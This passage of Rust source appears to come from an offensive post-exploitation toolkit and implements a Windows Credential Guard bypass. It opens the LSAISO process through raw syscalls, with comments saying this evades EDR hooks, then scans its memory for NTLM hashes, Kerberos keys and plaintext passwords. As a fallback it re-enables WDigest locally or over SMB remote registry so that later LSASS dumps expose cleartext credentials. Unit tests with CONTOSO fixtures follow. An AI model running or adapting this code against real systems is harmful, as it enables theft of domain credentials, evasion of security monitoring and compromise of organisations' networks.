    let message = if success {
        format!(
            "LSAISO ALPC extraction: {} credentials ({} NTLM, {} Kerberos, {} plaintext, {} cached)",
            credentials.len(),
            ntlm_count,
            kerberos_count,
            plaintext_count,
            domain_cache_count,
        )
    } else {
        "LSAISO ALPC extraction completed but no credentials found".to_string()
    };

    if success {
        info!("{message}");
    } else {
        warn!("{message}");
    }

    Ok(LsaIsoExtractionResult {
        success,
        stats: LsaIsoExtractionStats {
            total_count: credentials.len(),
            ntlm_count,
            kerberos_count,
            plaintext_count,
            domain_cache_count,
        },
        credentials,
        message,
        method: LsaIsoBypassMethod::Alpc,
    })
}

/// Non-Windows stub: LSAISO bypass is Windows-specific.
#[cfg(not(target_os = "windows"))]
pub fn extract_credentials_via_lsaiso() -> Result<LsaIsoExtractionResult> {
    Err(OverthroneError::NotImplemented {
        module: "lsaiso::extract_credentials_via_lsaiso (requires Windows)".to_string(),
    })
}

/// Check if the LSAISO ALPC endpoint is available on this system.
/// If it is, Credential Guard is likely active and we can attempt a bypass.
#[cfg(target_os = "windows")]
pub fn is_lsaiso_available() -> bool {
    alpc::AlpcHandle::connect(LSAISO_PORT_NAME).is_ok()
}

#[cfg(not(target_os = "windows"))]
pub fn is_lsaiso_available() -> bool {
    false
}

/// Attempt to extract credentials from LSAISO process memory.
///
/// Finds the LSAISO process, opens it with PROCESS_VM_ACCESS via raw
/// syscall (avoiding EDR hooks), reads all readable memory regions,
/// and scans for credential entries.
///
/// # Safety
/// Requires running as SYSTEM. The LSAISO VBS enclave may not be
/// readable from user mode without a kernel driver.
#[cfg(target_os = "windows")]
pub unsafe fn extract_credentials_via_lsaiso_memory(
    numbers: &crate::postex::syscall::SyscallNumbers,
) -> Result<LsaIsoExtractionResult> {
    unsafe {
        info!("Attempting LSAISO credential extraction via process memory");

        let pid = find_lsaiso_process(numbers)?;
        info!("Found LSAISO process with PID: {pid}");

        let mut handle: isize = 0;
        let access: u32 = 0x0010 | 0x0020; // PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
        let mut object_attr: [u8; 24] = [0u8; 24]; // OBJECT_ATTRIBUTES: Length=24, RootDirectory=0, ObjectName=0, Attributes=0, SecurityDescriptor=0, SecurityQualityOfService=0
        let obj_attr_ptr = object_attr.as_mut_ptr() as *const std::ffi::c_void;
        let mut client_id: [u8; 16] = [0u8; 16]; // CLIENT_ID: UniqueProcess=pid, UniqueThread=0
        std::ptr::write(client_id.as_mut_ptr() as *mut u32, pid);

        let open_status = crate::postex::syscall::nt_open_process(
            numbers.nt_open_process,
            &mut handle,
            access,
            obj_attr_ptr,
            client_id.as_ptr() as *const std::ffi::c_void,
        );

        if open_status.is_error() || handle == 0 {
            return Err(OverthroneError::PostExploitation(format!(
                "Failed to open LSAISO process (PID {pid}). \
                 CG VBS enclave may not be readable from user mode. \
                 Error: {:?}",
                open_status
            )));
        }

        info!("Opened LSAISO process handle: {handle:#x}");

        let process_data = read_lsaiso_process_regions(handle, numbers, 64)?;
        info!(
            "Read {} bytes from LSAISO process memory in {} regions",
            process_data.len(),
            1
        );

        let scan_result = scan_lsaiso_memory_for_creds(&process_data);

        let valid_creds: Vec<LsaIsoCredential> = scan_result
            .credentials
            .into_iter()
            .filter(is_valid_memory_credential)
            .collect();

        let mut ntlm_count = 0;
        let mut kerberos_count = 0;
        let mut plaintext_count = 0;
        let mut domain_cache_count = 0;

        for cred in &valid_creds {
            if cred.ntlm_hash.is_some() {
                ntlm_count += 1;
            }
            if cred.aes256_key.is_some() || cred.rc4_key.is_some() {
                kerberos_count += 1;
            }
            if cred.plaintext.is_some() {
                plaintext_count += 1;
            }
            if cred.cred_type == LsaIsoCredType::DomainCached {
                domain_cache_count += 1;
            }
        }

        let success = !valid_creds.is_empty();
        let message = if success {
            format!(
                "LSAISO process memory extraction: {} credentials ({} NTLM, {} Kerberos, {} plaintext, {} cached)",
                valid_creds.len(),
                ntlm_count,
                kerberos_count,
                plaintext_count,
                domain_cache_count,
            )
        } else {
            "LSAISO process memory scan completed but no valid credentials found".to_string()
        };

        if success {
            info!("{message}");
        } else {
            warn!("{message}");
        }

        // Close the handle
        let _ = crate::postex::syscall::nt_close(numbers.nt_close, handle);

        Ok(LsaIsoExtractionResult {
            success,
            stats: LsaIsoExtractionStats {
                total_count: valid_creds.len(),
                ntlm_count,
                kerberos_count,
                plaintext_count,
                domain_cache_count,
            },
            credentials: valid_creds,
            message,
            method: LsaIsoBypassMethod::ProcessMemory,
        })
    }
}

/// # Safety
/// This function performs no actual operations on non-Windows platforms.
/// It is marked `unsafe` for API compatibility with the Windows variant.
#[cfg(not(target_os = "windows"))]
pub unsafe fn extract_credentials_via_lsaiso_memory(
    _numbers: &crate::postex::syscall::SyscallNumbers,
) -> Result<LsaIsoExtractionResult> {
    Err(OverthroneError::NotImplemented {
        module: "lsaiso::extract_credentials_via_lsaiso_memory (requires Windows)".to_string(),
    })
}

/// Unified Credential Guard bypass that tries all methods in order.
///
/// Method priority:
/// 1. ALPC endpoint communication (fast, works on some builds)
/// 2. LSAISO process memory reading (powerful, may require kernel support)
/// 3. WDigest re-enablement (practical fallback, requires next logon)
///
/// # Arguments
/// * `config` - Bypass configuration (which methods to try)
/// * `numbers` - Resolved syscall numbers
/// * `smb_session` - Optional SMB session for remote registry modifications
///
/// # Returns
/// `CgBypassResult` with combined results from all attempted methods.
pub async fn extract_credentials_cg_bypass(
    config: &LsaisoBypassConfig,
    numbers: &crate::postex::syscall::SyscallNumbers,
    smb_session: Option<&mut crate::proto::smb::SmbSession>,
) -> CgBypassResult {
    let mut result = CgBypassResult::new();

    // Method 1: ALPC
    if config.try_alpc {
        match extract_credentials_via_lsaiso() {
            Ok(alpc_result) => {
                result.method_messages.push(alpc_result.message.clone());
                if alpc_result.success {
                    info!("LSAISO bypass: ALPC method succeeded");
                    result.success = true;
                    result.method = LsaIsoBypassMethod::Alpc;
                    result.credentials = alpc_result.credentials;
                    result.stats = alpc_result.stats;
                    result.message = alpc_result.message;
                    return result;
                }
                info!("LSAISO bypass: ALPC found no credentials, trying next method");
            }
            Err(e) => {
                let msg = format!("ALPC method failed: {e}");
                warn!("{msg}");
                result.method_messages.push(msg);
            }
        }
    } else {
        result
            .method_messages
            .push("ALPC method skipped by config".to_string());
    }

    // Method 2: Process memory reading
    if config.try_process_memory {
        match unsafe { extract_credentials_via_lsaiso_memory(numbers) } {
            Ok(mem_result) => {
                result.method_messages.push(mem_result.message.clone());
                if mem_result.success {
                    info!("LSAISO bypass: process memory method succeeded");
                    result.success = true;
                    result.method = LsaIsoBypassMethod::ProcessMemory;
                    result.credentials = mem_result.credentials;
                    result.stats = mem_result.stats;
                    result.message = mem_result.message;
                    return result;
                }
                info!("LSAISO bypass: process memory found no credentials, trying next method");
            }
            Err(e) => {
                let msg = format!("Process memory method failed: {e}");
                warn!("{msg}");
                result.method_messages.push(msg);
            }
        }
    } else {
        result
            .method_messages
            .push("Process memory method skipped by config".to_string());
    }

    // Method 3: WDigest re-enablement
    if config.try_wdigest {
        if let Some(smb) = smb_session {
            match enable_wdigest_remote(smb).await {
                Ok(msg) => {
                    result.method_messages.push(msg.clone());
                    result.wdigest_enabled = true;
                    result.message = "WDigest re-enabled via remote registry. Extract credentials on next interactive logon via LSASS dump.".to_string();
                    result.success = true;
                    result.method = LsaIsoBypassMethod::WdigestFallback;
                    info!("LSAISO bypass: WDigest re-enabled via remote registry");
                    return result;
                }
                Err(e) => {
                    let msg = format!("WDigest remote re-enablement failed: {e}");
                    warn!("{msg}");
                    result.method_messages.push(msg);
                }
            }
        } else if config.smb_target.is_some() {
            let msg =
                "WDigest re-enablement requires an SMB connection (none provided)".to_string();
            warn!("{msg}");
            result.method_messages.push(msg);
        }

        // Also try local WDigest re-enablement (if running as SYSTEM on target)
        match unsafe { enable_wdigest_local(numbers) } {
            Ok(msg) => {
                result.method_messages.push(msg.clone());
                result.wdigest_enabled = true;
                if !result.success {
                    result.message = "WDigest re-enabled locally. Extract credentials on next interactive logon via LSASS dump.".to_string();
                    result.success = true;
                    result.method = LsaIsoBypassMethod::WdigestFallback;
                }
                info!("LSAISO bypass: WDigest re-enabled locally");
            }
            Err(e) => {
                let msg = format!("WDigest local re-enablement failed: {e}");
                debug!("{msg}");
                result.method_messages.push(msg);
            }
        }
    } else {
        result
            .method_messages
            .push("WDigest fallback skipped by config".to_string());
    }

    if !result.success {
        result.message = "All LSAISO bypass methods failed. Consider alternative approaches (Shadow Credentials, RBCD).".to_string();
        warn!("{}", result.message);
    }

    result
}

// ─────────────────────────────────────────────────────────────
//  Tests
// ─────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_credential_entry_basic() {
        let mut data = Vec::new();
        data.extend_from_slice(&8u32.to_le_bytes());
        data.extend_from_slice(&0u32.to_le_bytes());
        data.extend_from_slice(&1u32.to_le_bytes());
        data.extend_from_slice(&16u32.to_le_bytes());
        data.extend_from_slice(b"CONTOSO\\");
        data.extend_from_slice(&[
            0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
            0x88, 0x99,
        ]);

        let entry = parse_credential_entry(&data).unwrap();
        assert_eq!(entry.identity, "CONTOSO\\");
        assert_eq!(entry.cred_type, LsaIsoCredType::DomainCached);
        assert_eq!(entry.ntlm_hash.unwrap(), "aabbccddeeff00112233445566778899");
    }

    #[test]
    fn test_parse_credential_entry_short_data() {
        let data = vec![0u8; 4];
        assert!(parse_credential_entry(&data).is_err());
    }

    #[test]
    fn test_parse_empty_response() {
        let header = LsaIsoResponseHeader {
            message_type: 0x2001,
            status: 0,
            entry_count: 0,
            payload_size: 0,
        };
        let bytes = unsafe {
            std::slice::from_raw_parts(
                &header as *const LsaIsoResponseHeader as *const u8,
                mem::size_of::<LsaIsoResponseHeader>(),
            )
        };
        let creds = parse_lsaiso_response(bytes).unwrap();
        assert!(creds.is_empty());
    }

    #[test]
    fn test_parse_error_response() {
        let header = LsaIsoResponseHeader {
            message_type: 0x2001,
            status: 0xC0000001,
            entry_count: 0,
            payload_size: 0,
        };
        let bytes = unsafe {
            std::slice::from_raw_parts(
                &header as *const LsaIsoResponseHeader as *const u8,
                mem::size_of::<LsaIsoResponseHeader>(),
            )
        };
        assert!(parse_lsaiso_response(bytes).is_err());
    }

    #[test]
    fn test_build_request() {
        let request = build_lsaiso_request(LsaIsoOpCode::QueryDomainCredentials, b"test");
        assert!(request.len() > mem::size_of::<LsaIsoRequestHeader>());
        let message_type = u32::from_le_bytes(request[0..4].try_into().unwrap());
        let op_code = u32::from_le_bytes(request[4..8].try_into().unwrap());
        let payload_size = u32::from_le_bytes(request[12..16].try_into().unwrap());
        assert_eq!(message_type, 0x1001);
        assert_eq!(op_code, LsaIsoOpCode::QueryDomainCredentials as u32);
        assert_eq!(payload_size, 4);
    }

    #[test]
    fn test_op_code_display() {
        assert_eq!(
            LsaIsoOpCode::QueryAllSessions.to_string(),
            "QueryAllSessions"
        );
        assert_eq!(
            LsaIsoOpCode::QueryDomainCredentials.to_string(),
            "QueryDomainCredentials"
        );
    }

    #[test]
    fn test_extraction_result_stats() {
        let result = LsaIsoExtractionResult {
            success: true,
            credentials: vec![],
            stats: LsaIsoExtractionStats {
                total_count: 5,
                ntlm_count: 3,
                kerberos_count: 2,
                plaintext_count: 1,
                domain_cache_count: 2,
            },
            message: "Test extraction complete".to_string(),
            method: LsaIsoBypassMethod::Alpc,
        };
        assert!(result.success);
        assert_eq!(result.stats.total_count, 5);
        assert_eq!(result.stats.ntlm_count, 3);
        assert_eq!(result.stats.kerberos_count, 2);
        assert_eq!(result.stats.plaintext_count, 1);
        assert_eq!(result.stats.domain_cache_count, 2);
    }

    #[test]
    fn test_non_windows_stub() {
        #[cfg(not(target_os = "windows"))]
        {
            let result = extract_credentials_via_lsaiso();
            assert!(result.is_err());
        }
    }

    #[test]
    fn test_scan_memory_empty() {
        let result = scan_lsaiso_memory_for_creds(&[]);
        assert!(result.credentials.is_empty());
        assert_eq!(result.regions_scanned, 0);
    }

    #[test]
    fn test_scan_memory_no_sig() {
        let data = vec![0u8; 1024];
        let result = scan_lsaiso_memory_for_creds(&data);
        assert!(result.credentials.is_empty());
        assert_eq!(result.regions_scanned, 0);
    }

    #[test]
    fn test_scan_memory_with_signature_short_entry() {
        let mut data = Vec::new();
        data.extend_from_slice(&LSAISO_CRED_SIGNATURE.to_le_bytes());
        data.extend_from_slice(&4u32.to_le_bytes()); // entry_size = 4 (too small)
        let result = scan_lsaiso_memory_for_creds(&data);
        assert!(result.credentials.is_empty());
        assert_eq!(result.regions_scanned, 1);
    }

    #[test]
    fn test_scan_memory_with_valid_entry() {
        let mut data = Vec::new();
        data.extend_from_slice(&LSAISO_CRED_SIGNATURE.to_le_bytes());
        // Build a valid credential entry
        let mut entry = Vec::new();
        entry.extend_from_slice(&8u32.to_le_bytes()); // identity_len
        entry.extend_from_slice(&0u32.to_le_bytes()); // target_len
        entry.extend_from_slice(&1u32.to_le_bytes()); // flags (DomainCached)
        entry.extend_from_slice(&16u32.to_le_bytes()); // hash_len
        entry.extend_from_slice(b"CONTOSO\\"); // identity (8 bytes)
        entry.extend_from_slice(&[0xaa; 16]); // NTLM hash (16 bytes)

        data.extend_from_slice(&(entry.len() as u32).to_le_bytes());
        data.extend_from_slice(&entry);

        let result = scan_lsaiso_memory_for_creds(&data);
        assert_eq!(result.regions_scanned, 1);
        assert_eq!(result.credentials.len(), 1);
        assert_eq!(result.credentials[0].identity, "CONTOSO\\");
        assert_eq!(
            result.credentials[0].ntlm_hash.as_deref().unwrap(),
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        );
    }

    #[test]
    fn test_scan_memory_multiple_entries() {
        let mut data = Vec::new();
        for i in 0..3 {
            data.extend_from_slice(&LSAISO_CRED_SIGNATURE.to_le_bytes());
            let mut entry = Vec::new();
            let name = format!("USER{i}\\");
            entry.extend_from_slice(&(name.len() as u32).to_le_bytes());
            entry.extend_from_slice(&0u32.to_le_bytes());
            entry.extend_from_slice(&1u32.to_le_bytes());
            entry.extend_from_slice(&16u32.to_le_bytes());
            entry.extend_from_slice(name.as_bytes());
            entry.extend_from_slice(&[0xbb; 16]);
            data.extend_from_slice(&(entry.len() as u32).to_le_bytes());
            data.extend_from_slice(&entry);
        }

        let result = scan_lsaiso_memory_for_creds(&data);
        assert_eq!(result.regions_scanned, 3);
        assert_eq!(result.credentials.len(), 3);
        assert_eq!(result.credentials[0].identity, "USER0\\");
        assert_eq!(result.credentials[1].identity, "USER1\\");
        assert_eq!(result.credentials[2].identity, "USER2\\");
    }

    #[test]
    fn test_scan_memory_skips_garbage() {
        let mut data = vec![0xFFu8; 512];
        // Embed a signature at offset 256
        data[256..260].copy_from_slice(&LSAISO_CRED_SIGNATURE.to_le_bytes());
        data[260..264].copy_from_slice(&0u32.to_le_bytes()); // entry_size = 0

        let result = scan_lsaiso_memory_for_creds(&data);
        assert_eq!(result.regions_scanned, 1);
        assert!(result.credentials.is_empty());
    }

    #[test]
    fn test_is_valid_memory_credential() {
        let valid = LsaIsoCredential {
            identity: "CONTOSO\\Admin".into(),
            target: String::new(),
            ntlm_hash: Some("aabbccdd".into()),
            lm_hash: None,
            aes256_key: None,
            aes128_key: None,
            rc4_key: None,
            plaintext: None,
            cred_type: LsaIsoCredType::DomainCached,
        };
        assert!(is_valid_memory_credential(&valid));

        let no_identity = LsaIsoCredential {
            identity: String::new(),
            ..valid.clone()
        };
        assert!(!is_valid_memory_credential(&no_identity));

        let empty_cred = LsaIsoCredential {
            identity: "CONTOSO\\Admin".into(),
            ntlm_hash: None,
            aes256_key: None,
            aes128_key: None,
            rc4_key: None,
            plaintext: None,
            ..valid
        };
        assert!(!is_valid_memory_credential(&empty_cred));
    }

    #[test]
    fn test_lsaiso_bypass_method_display() {
        assert_eq!(LsaIsoBypassMethod::Alpc.to_string(), "ALPC");
        assert_eq!(
            LsaIsoBypassMethod::ProcessMemory.to_string(),
            "ProcessMemory"
        );
        assert_eq!(
            LsaIsoBypassMethod::WdigestFallback.to_string(),
            "WDigestFallback"
        );
        assert_eq!(LsaIsoBypassMethod::Failed.to_string(), "Failed");
    }

    #[test]
    fn test_bypass_config_default() {
        let config = LsaisoBypassConfig::default();
        assert!(config.try_alpc);
        assert!(config.try_process_memory);
        assert!(config.try_wdigest);
    }

    #[test]
    fn test_cg_bypass_result_initial_state() {
        let result = CgBypassResult::new();
        assert!(!result.success);
        assert!(!result.wdigest_enabled);
        assert_eq!(result.method, LsaIsoBypassMethod::Failed);
        assert!(result.credentials.is_empty());
        assert!(result.method_messages.is_empty());
    }

    #[test]
    fn test_memory_scan_result_counts() {
        let scan = LsaisoMemoryScanResult {
            credentials: vec![LsaIsoCredential {
                identity: "CONTOSO\\A".into(),
                target: String::new(),
                ntlm_hash: Some("aa".into()),
                lm_hash: None,
                aes256_key: None,
                aes128_key: None,
                rc4_key: None,
                plaintext: None,
                cred_type: LsaIsoCredType::DomainCached,
            }],
            regions_scanned: 5,
            total_bytes_read: 65536,
        };
        assert_eq!(scan.credentials.len(), 1);
        assert_eq!(scan.regions_scanned, 5);
        assert_eq!(scan.total_bytes_read, 65536);
    }

    #[test]
    fn test_extraction_result_with_method() {
        let result = LsaIsoExtractionResult {
            success: true,
            credentials: vec![],
            stats: LsaIsoExtractionStats {
                total_count: 0,
                ntlm_count: 0,
                kerberos_count: 0,
                plaintext_count: 0,
                domain_cache_count: 0,
            },
            message: "test".into(),
            method: LsaIsoBypassMethod::ProcessMemory,
        };
        assert_eq!(result.method, LsaIsoBypassMethod::ProcessMemory);
    }

    #[test]
    fn test_extraction_result_serde_roundtrip() {
        let cred = LsaIsoCredential {
            identity: "CONTOSO\\Admin".into(),
            target: "corp.local".into(),
            ntlm_hash: Some("aabbccddeeff00112233445566778899".into()),
            lm_hash: None,
            aes256_key: Some(
                "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899".into(),
            ),
            aes128_key: None,
            rc4_key: None,
            plaintext: None,
            cred_type: LsaIsoCredType::LogonSession,
        };
        let json = serde_json::to_string(&cred).unwrap();
        let deserialized: LsaIsoCredential = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.identity, cred.identity);
        assert_eq!(deserialized.ntlm_hash, cred.ntlm_hash);
        assert_eq!(deserialized.aes256_key, cred.aes256_key);
    }

    #[test]
    fn test_scan_memory_partial_entries_does_not_panic() {
        // Entries at the boundary of the data buffer should not cause panics.
        let mut data = Vec::new();
        data.extend_from_slice(&LSAISO_CRED_SIGNATURE.to_le_bytes());
        data.extend_from_slice(&1000u32.to_le_bytes()); // entry_size beyond buffer
        // Do NOT add the entry data — buffer is truncated
        let result = scan_lsaiso_memory_for_creds(&data);
        assert!(result.credentials.is_empty());
    }

    #[test]
    fn test_parse_credential_entry_supplemental_flag() {
        let mut data = Vec::new();
        data.extend_from_slice(&0u32.to_le_bytes()); // identity_len = 0
        data.extend_from_slice(&0u32.to_le_bytes()); // target_len = 0
        data.extend_from_slice(&4u32.to_le_bytes()); // flags = Supplemental (0x04)
        data.extend_from_slice(&0u32.to_le_bytes()); // hash_len = 0

        let entry = parse_credential_entry(&data).unwrap();
        assert_eq!(entry.cred_type, LsaIsoCredType::Supplemental);
    }

    #[test]
    fn test_parse_credential_entry_kerberos_flag() {
        let mut data = Vec::new();
        data.extend_from_slice(&0u32.to_le_bytes());
        data.extend_from_slice(&0u32.to_le_bytes());
        data.extend_from_slice(&2u32.to_le_bytes()); // flags = KerberosCache (0x02)
        data.extend_from_slice(&0u32.to_le_bytes());

        let entry = parse_credential_entry(&data).unwrap();
        assert_eq!(entry.cred_type, LsaIsoCredType::KerberosCache);
    }

    #[test]
    fn test_cred_type_display() {
        assert_eq!(LsaIsoCredType::DomainCached.to_string(), "DomainCached");
        assert_eq!(LsaIsoCredType::KerberosCache.to_string(), "KerberosCache");
        assert_eq!(LsaIsoCredType::Supplemental.to_string(), "Supplemental");
        assert_eq!(LsaIsoCredType::LogonSession.to_string(), "LogonSession");
    }
}
